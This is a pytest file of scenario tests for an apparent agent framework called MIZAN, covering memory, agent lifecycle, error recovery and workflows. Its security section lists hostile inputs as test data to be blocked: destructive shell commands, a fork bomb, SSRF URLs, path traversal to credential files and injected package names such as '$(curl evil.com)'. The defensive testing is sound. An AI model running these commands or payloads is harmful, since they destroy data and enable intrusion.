"""
End-to-End User Scenario Tests
================================

Real-world use cases simulating what a user actually does:

Scenario 1: First-Time Setup
  New user runs doctor → fixes issues → system is healthy

Scenario 2: Learning Session
  User teaches system facts → system remembers → no duplicates

Scenario 3: Recall & Association
  System learns multiple topics → user queries → finds associations

Scenario 4: Agent Lifecycle
  Create agent → agent works → evolves Nafs → energy depletes → rests

Scenario 5: Error Recovery
  Agent fails → Tawbah recovery → learns from error → succeeds next time

Scenario 6: Emotional Intelligence
  Frustrated user → Qalb detects → patient response tone

Scenario 7: Long-Running Task
  Complex request → Sabr decomposes → tracks progress → completes

Scenario 8: Security Gauntlet
  Various attack attempts → all blocked → audit logged
"""

import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent / "backend"))


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 1: First-Time Setup (Doctor Self-Healing)
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioFirstTimeSetup:
    """A new user installs MIZAN and runs the doctor."""

    def test_fresh_install_doctor_diagnosis(self):
        """Doctor should diagnose a fresh install and identify issues."""
        from doctor import run_doctor

        report = run_doctor(auto_fix=False, check_only=True)
        assert len(report.checks) >= 10
        # Should have some passes (Python version, dependencies)
        assert report.passed > 0

    def test_doctor_auto_fixes_in_temp_dir(self):
        """Doctor should auto-fix data directory in a temp install."""
        from doctor import CheckStatus, check_data_directory

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch("doctor._get_project_root", return_value=Path(tmpdir)):
                result = check_data_directory(auto_fix=True)
                assert result.status == CheckStatus.FIXED
                assert (Path(tmpdir) / "data").exists()

    def test_doctor_creates_env_from_template(self):
        """Doctor should create .env from .env.example."""
        from doctor import CheckStatus, check_env_file

        with tempfile.TemporaryDirectory() as tmpdir:
            tmppath = Path(tmpdir)
            (tmppath / ".env.example").write_text("ANTHROPIC_API_KEY=\nSECRET_KEY=change-this")
            with patch("doctor._get_project_root", return_value=tmppath):
                result = check_env_file(auto_fix=True)
                assert result.status == CheckStatus.FIXED
                assert (tmppath / ".env").exists()

    def test_doctor_generates_secret_key(self):
        """Doctor should replace insecure default SECRET_KEY."""
        from doctor import CheckStatus, check_secret_key

        with tempfile.TemporaryDirectory() as tmpdir:
            tmppath = Path(tmpdir)
            (tmppath / ".env").write_text("SECRET_KEY=change-this-to-a-secure-random-string")
            with patch("doctor._get_project_root", return_value=tmppath):
                result = check_secret_key(auto_fix=True)
                assert result.status == CheckStatus.FIXED
                content = (tmppath / ".env").read_text()
                assert "change-this-to-a-secure-random-string" not in content

    def test_doctor_report_json_format(self):
        """Doctor report should serialize to valid JSON."""
        from doctor import report_to_dict, run_doctor

        report = run_doctor(check_only=True)
        d = report_to_dict(report)
        assert isinstance(d, dict)
        assert "healthy" in d
        assert "checks" in d
        assert all("name" in c and "status" in c for c in d["checks"])

    def test_doctor_plain_text_format(self):
        """Doctor report should format as readable plain text."""
        from doctor import format_report_plain, run_doctor

        report = run_doctor(check_only=True)
        text = format_report_plain(report)
        assert "MIZAN Doctor" in text
        assert "passed" in text


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 2: Learning Session (No Duplication)
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioLearningSession:
    """User teaches the system multiple facts. System learns without duplication."""

    def test_learn_and_verify_no_duplicates(self):
        from memory.masalik import MasalikNetwork

        net = MasalikNetwork()

        # Teach: "Python is great for data science"
        net.encode("Python is great for data science", importance=0.8)
        pathways_after_first = len(net.pathways)
        concepts_after_first = len(net.concepts)

        # Teach the SAME thing again
        result2 = net.encode("Python is great for data science", importance=0.8)
        pathways_after_second = len(net.pathways)
        concepts_after_second = len(net.concepts)

        # ZERO new pathways, only strengthened
        assert result2["new_pathways"] == 0
        assert result2["pathways_strengthened"] > 0
        assert pathways_after_second == pathways_after_first
        assert concepts_after_second == concepts_after_first

    def test_related_topics_strengthen_shared_concepts(self):
        from memory.masalik import MasalikNetwork

        net = MasalikNetwork()

        net.encode("Python is used in machine learning", importance=0.8)
        net.encode("Machine learning requires large datasets", importance=0.8)
        net.encode("Python has powerful data processing libraries", importance=0.8)

        # "machine" and "learn" should have strong pathways now (multiple encodings)
        stats = net.stats()
        assert stats["total_concepts"] > 5
        assert stats["total_pathways"] > 5

    def test_hikmah_through_repetition(self):
        from memory.masalik import MasalikNetwork

        net = MasalikNetwork()

        # Teach 15 times → should form Hikmah (wisdom)
        for _ in range(15):
            net.encode("Python is a programming language", importance=1.0)

        hikmah = net.get_hikmah()
        assert len(hikmah) > 0, "Repeated learning should form permanent wisdom pathways"


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 3: Recall & Association
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioRecallAssociation:
    """System learns multiple topics, user queries, finds cross-topic associations."""

    def test_cross_topic_recall(self):
        from memory.masalik import MasalikNetwork

        net = MasalikNetwork()

        # Teach about multiple topics
        net.encode("Python is excellent for web development", importance=0.8)
        net.encode("Django is a Python web framework", importance=0.8)
        net.encode("Flask is a lightweight Python framework", importance=0.8)
        net.encode("React is a JavaScript frontend framework", importance=0.8)

        # Query about Python → should find web, Django, Flask associations
        results = net.recall("Python")
        # Should find framework-related concepts through Python
        assert len(results) > 0

    def test_recall_strengthens_memory(self):
        from memory.masalik import MasalikNetwork

        net = MasalikNetwork()
        net.encode("SQL databases store structured data", importance=0.8)

        # Get pathway weights before recall
        weights_before = {
            k: p.weight for k, p in net.pathways.items() if p.pathway_type != "fitrah"
        }

        # Recall (Dhikr) — should strengthen
        net.recall("SQL databases")

        # Check some pathways got stronger
        strengthened = 0
        for k, p in net.pathways.items():
            if k in weights_before and p.weight > weights_before[k]:
                strengthened += 1

        assert strengthened > 0, "Recall (Dhikr) should strengthen pathways"


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 4: Agent Lifecycle
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioAgentLifecycle:
    """Create agent → work → evolve → deplete energy → rest → recover."""

    def test_full_agent_lifecycle(self):
        from agents.specialized import create_agent
        from core.ruh_engine import RuhEngine
        from core.shukr import ShukrSystem

        ruh = RuhEngine()
        shukr = ShukrSystem()
        wali = MagicMock()
        wali.validate_command.return_value = True
        wali.validate_url.return_value = True
        wali.validate_file_path.return_value = True
        wali.audit = MagicMock()
        izn = MagicMock()
        izn.check_permission.return_value = {
            "allowed": True,
            "reason": "ok",
            "requires_approval": False,
        }

        # 1. Create agent
        agent = create_agent("general", name="Worker", wali=wali, izn=izn)
        assert agent.nafs_level == 1

        # 2. Agent works on tasks
        ruh.initialize_agent(agent.id)
        for _i in range(30):
            # Simulate successful task
            ruh.consume_energy(agent.id, "moderate")
            agent.total_tasks += 1
            agent.success_count += 1
            shukr.record_success(agent.id, "general", "task_execution", 1000)

        # 3. Check energy depleted
        state = ruh.get_state(agent.id)
        assert state.energy < 100.0
        assert state.fatigue_level > 0.0

        # 4. Check Nafs evolved
        agent.evolve_nafs()
        assert agent.nafs_level >= 2, "30 tasks at 100% should reach at least Lawwama"

        # 5. Check strengths tracked
        strengths = shukr.get_strengths(agent.id)
        assert len(strengths) > 0

        # 6. Rest
        ruh.rest(agent.id)
        state = ruh.get_state(agent.id)
        assert state.total_tasks_since_rest == 0


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 5: Error Recovery (Tawbah)
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioErrorRecovery:
    """Agent encounters error → Tawbah recovery → learns → succeeds next time."""

    def test_tawbah_full_recovery_with_learning(self):
        from core.tawbah import TawbahProtocol, TawbahStage

        tawbah = TawbahProtocol()

        # 1. Agent encounters a FileNotFoundError
        record = tawbah.acknowledge(
            "agent-1",
            FileNotFoundError("/data/config.json"),
            "Read configuration file",
        )
        assert record.stage == TawbahStage.ACKNOWLEDGE

        # 2. Analyze root cause
        tawbah.analyze(record, "Config file path was hardcoded, directory doesn't exist")
        assert record.stage == TawbahStage.ANALYZE

        # 3. Plan the fix
        tawbah.plan(record, "Use os.path.exists() check and create directory if missing")

        # 4. Apply the fix
        tawbah.apply(record, "Added path existence check and auto-creation")

        # 5. Verify success
        tawbah.verify(
            record,
            success=True,
            lesson="Always validate file paths before reading, create directories as needed",
        )
        assert record.success is True
        assert record.stage == TawbahStage.COMPLETE

        # 6. Next time same error → agent has prior knowledge
        prior = tawbah.has_prior_fix("FileNotFoundError")
        assert prior is not None
        assert "path" in prior["lesson"].lower() or "file" in prior["lesson"].lower()

    def test_tawbah_retry_and_eventual_success(self):
        from core.tawbah import TawbahProtocol, TawbahStage

        tawbah = TawbahProtocol()

        record = tawbah.acknowledge("agent-1", ConnectionError("timeout"), "API call")

        # First attempt fails
        tawbah.analyze(record, "Server timeout")
        tawbah.plan(record, "Increase timeout")
        tawbah.apply(record, "Set timeout to 30s")
        tawbah.verify(record, success=False)
        assert record.attempts == 2
        assert record.stage == TawbahStage.ANALYZE  # Sent back for re-analysis

        # Second attempt succeeds
        tawbah.analyze(record, "Server was overloaded")
        tawbah.plan(record, "Add retry with backoff")
        tawbah.apply(record, "Implemented exponential backoff")
        tawbah.verify(record, success=True, lesson="Use retry with backoff for API calls")
        assert record.success is True


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 6: Emotional Intelligence
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioEmotionalIntelligence:
    """User goes through different emotions → Qalb adapts response tone."""

    def test_emotional_journey(self):
        from core.qalb import EmotionalState, QalbEngine, ToneStyle

        qalb = QalbEngine()
        user_id = "user-frustrated-dev"

        # 1. User starts neutral
        reading = qalb.analyze("Can you help me with a Python script?")
        qalb.record(user_id, reading)
        assert reading.state == EmotionalState.NEUTRAL

        # 2. User gets frustrated
        reading = qalb.analyze("This is so frustrating, nothing works, keeps failing!")
        qalb.record(user_id, reading)
        assert reading.state == EmotionalState.FRUSTRATED
        assert reading.recommended_tone == ToneStyle.PATIENT

        # 3. System suggests empathetic prefix
        prefix = qalb.suggest_response_prefix(reading)
        assert prefix is not None
        assert "frustrating" in prefix.lower()

        # 4. User calms down, appreciates help
        reading = qalb.analyze("Thanks so much! That was awesome, great explanation!")
        qalb.record(user_id, reading)
        assert reading.state == EmotionalState.POSITIVE

        # 5. Check emotional trend
        trend = qalb.get_trend(user_id)
        assert trend["readings"] == 3
        # No single dominant state since emotions varied
        assert trend["stability"] < 1.0 or trend["readings"] == 3


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 7: Long-Running Task with Sabr
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioLongRunningTask:
    """Complex task → Sabr decomposes → step-by-step execution → completion."""

    def test_full_workflow_execution(self):
        from core.sabr import SabrEngine, SabrTaskState

        sabr = SabrEngine()

        # 1. Decompose the task
        steps = sabr.decompose_task("Implement user authentication system")
        assert len(steps) >= 3

        # 2. Create workflow
        wf = sabr.create_workflow("auth-agent", "Implement user auth", steps)
        assert wf.state == SabrTaskState.PENDING
        assert wf.progress == 0.0

        # 3. Execute each step
        for i in range(len(steps)):
            step = sabr.start_step(wf.id)
            assert step is not None
            assert step.state == SabrTaskState.RUNNING

            sabr.complete_step(wf.id, result=f"Completed step {i + 1}")

        # 4. Verify completion
        assert wf.state == SabrTaskState.COMPLETED
        assert wf.progress == 1.0

    def test_workflow_with_interruption(self):
        from core.sabr import SabrEngine, SabrTaskState

        sabr = SabrEngine()
        wf = sabr.create_workflow(
            "agent-1",
            "Long task",
            [
                "Step 1",
                "Step 2",
                "Step 3",
                "Step 4",
            ],
        )

        # Execute first two steps
        sabr.start_step(wf.id)
        sabr.complete_step(wf.id)
        sabr.start_step(wf.id)
        sabr.complete_step(wf.id)
        assert wf.progress == 0.5

        # Pause (e.g., user goes offline)
        sabr.start_step(wf.id)
        sabr.pause(wf.id)
        assert wf.state == SabrTaskState.PAUSED

        # Resume later
        sabr.resume(wf.id)
        assert wf.state == SabrTaskState.RUNNING

        # Continue and finish
        sabr.start_step(wf.id)
        sabr.complete_step(wf.id)
        sabr.start_step(wf.id)
        sabr.complete_step(wf.id)
        assert wf.state == SabrTaskState.COMPLETED


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 8: Security Gauntlet
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioSecurityGauntlet:
    """Various attack attempts → all should be caught and logged."""

    def test_command_injection_attacks(self):
        from security.wali import SecurityConfig, WaliGuardian

        wali = WaliGuardian(config=SecurityConfig())

        attacks = [
            "rm -rf /",
            "rm -rf /*",
            ":(){ :|:& };:",  # Fork bomb
            "dd if=/dev/zero of=/dev/sda",
            "sudo rm -rf /tmp",
            "> /dev/sda",
            "chmod 777 /",
            "eval 'malicious code'",
        ]

        for attack in attacks:
            assert wali.validate_command(attack) is False, f"Should have blocked: {attack}"

    def test_ssrf_attacks(self):
        from security.wali import SecurityConfig, WaliGuardian

        wali = WaliGuardian(config=SecurityConfig())

        ssrf_attempts = [
            "http://localhost:3000/admin",
            "http://127.0.0.1:8080/internal",
            "http://0.0.0.0:9000",
            "http://10.0.0.1/metadata",
            "http://192.168.1.1/router",
            "http://172.16.0.1/internal",
            "http://169.254.169.254/latest/meta-data",
        ]

        for url in ssrf_attempts:
            assert wali.validate_url(url) is False, f"Should have blocked SSRF: {url}"

    def test_path_traversal_attacks(self):
        from security.validation import sanitize_path

        traversals = [
            "../../../etc/passwd",
            "/tmp/mizan/../../etc/shadow",
            "/tmp/mizan/../../../root/.ssh/id_rsa",
        ]

        for path in traversals:
            sanitized = sanitize_path(path)
            assert ".." not in sanitized, f"Path traversal not resolved: {path} → {sanitized}"

    def test_input_overflow_attacks(self):
        from security.validation import validate_text_input

        # Giant input
        is_valid, _, _ = validate_text_input("A" * 100000, max_length=50000)
        assert is_valid is False

        # Null bytes
        is_valid, _, sanitized = validate_text_input("hello\x00world")
        assert "\x00" not in sanitized

    def test_package_injection_attacks(self):
        from security.validation import validate_package_name

        injections = [
            "flask; rm -rf /",
            "$(curl evil.com)",
            "`whoami`",
            "requests && rm -rf /",
        ]

        for pkg in injections:
            is_safe, _ = validate_package_name(pkg)
            assert is_safe is False, f"Should have blocked: {pkg}"

    def test_audit_log_captures_attacks(self):
        from security.wali import SecurityConfig, WaliGuardian

        wali = WaliGuardian(config=SecurityConfig())

        # Trigger several security events
        wali.validate_command("rm -rf /")
        wali.validate_url("http://localhost:3000")
        wali.validate_file_path("/etc/passwd")

        # Audit log should have entries
        summary = wali.get_audit_summary()
        assert summary["total_events"] > 0
        assert summary["warnings"] > 0


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 9: QCA Full Pipeline
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioQCAPipeline:
    """User question flows through all QCA layers."""

    def test_question_through_full_pipeline(self):
        from qca.engine import QCAEngine

        engine = QCAEngine()

        # 1. Process input
        perception = engine.process_input("What is the nature of knowledge and truth?")
        assert "perception" in perception
        assert "key_terms" in perception

        # 2. Reason about it
        answer = engine.reason(
            "What is knowledge?",
            context_text="Knowledge (Ilm) in Islam is the understanding of truth through evidence and reason.",
        )
        assert answer["confidence"] > 0

        # 3. Store what we learned
        engine.remember("knowledge_def", "Knowledge is understanding truth through evidence", 0.85)

        # 4. Recall later
        results = engine.recall("knowledge truth evidence")
        assert len(results) > 0

    def test_yaqin_certainty_levels(self):
        from qca.yaqin_engine import YaqinEngine, YaqinLevel

        yaqin = YaqinEngine()

        # 1. Agent makes an inference (Ilm al-Yaqin)
        tag = yaqin.tag_inference("There might be a bug here")
        assert tag.level == YaqinLevel.ILM_AL_YAQIN
        assert tag.confidence <= 0.6

        # 2. Agent verifies with tools (Ayn al-Yaqin)
        tag = yaqin.tag_observation("Test fails with NullPointerException", source="pytest")
        assert tag.level == YaqinLevel.AYN_AL_YAQIN
        assert tag.confidence >= 0.6

        # 3. Agent has proven pattern (Haqq al-Yaqin)
        tag = yaqin.tag_proven("Null check fix works", "null_fix", count=50)
        assert tag.level == YaqinLevel.HAQQ_AL_YAQIN
        assert tag.confidence >= 0.9

    def test_cognitive_method_selection(self):
        from qca.cognitive_methods import CognitiveMethod, select_method

        # Different queries should route to different methods
        assert select_method("prove this theorem logically") == CognitiveMethod.ISTIDLAL
        assert select_method("what is the meaning of this error?") == CognitiveMethod.TADABBUR
        assert select_method("analyze the components of this system") == CognitiveMethod.TAFAKKUR
        assert select_method("is this similar to the previous bug?") == CognitiveMethod.QIYAS


# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO 10: Integrated Memory + Agent + QCA
# ═══════════════════════════════════════════════════════════════════════════════


class TestScenarioIntegrated:
    """Test interactions between memory, agent, and QCA systems."""

    @pytest.mark.asyncio
    async def test_agent_learns_and_remembers(self):
        """Agent completes task → encodes to memory → recalls later."""
        import tempfile

        from memory.dhikr import DhikrMemorySystem

        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            memory = DhikrMemorySystem(db_path=f.name)

        # Agent learns something
        await memory.remember(
            "The authentication module uses JWT tokens with 24h expiry",
            memory_type="procedural",
            importance=0.9,
        )

        # Later, agent needs to recall
        results = await memory.recall("authentication JWT", memory_type="procedural")
        assert len(results) > 0

        # Masalik should also have the pathway
        masalik_results = memory.masalik.recall("authentication JWT")
        # Should find associated concepts
        assert isinstance(masalik_results, list)

    def test_qca_with_masalik_context(self):
        """QCA reasoning enhanced by Masalik pathway context."""
        from memory.masalik import MasalikNetwork
        from qca.engine import QCAEngine

        # Train masalik with domain knowledge
        net = MasalikNetwork()
        net.encode("SQL injection attacks exploit user input validation gaps", importance=0.9)
        net.encode(
            "Prepared statements prevent SQL injection by parameterizing queries", importance=0.9
        )
        net.encode("Input validation is critical for web security", importance=0.9)

        # Use QCA to reason
        engine = QCAEngine()
        answer = engine.reason(
            "How to prevent SQL injection?",
            context_text="SQL injection is a common web vulnerability where attackers inject malicious SQL.",
        )
        assert answer["confidence"] > 0

        # Masalik should provide associated context
        context = net.recall_context("SQL injection prevention")
        # Should have related concepts
        assert isinstance(context, str)
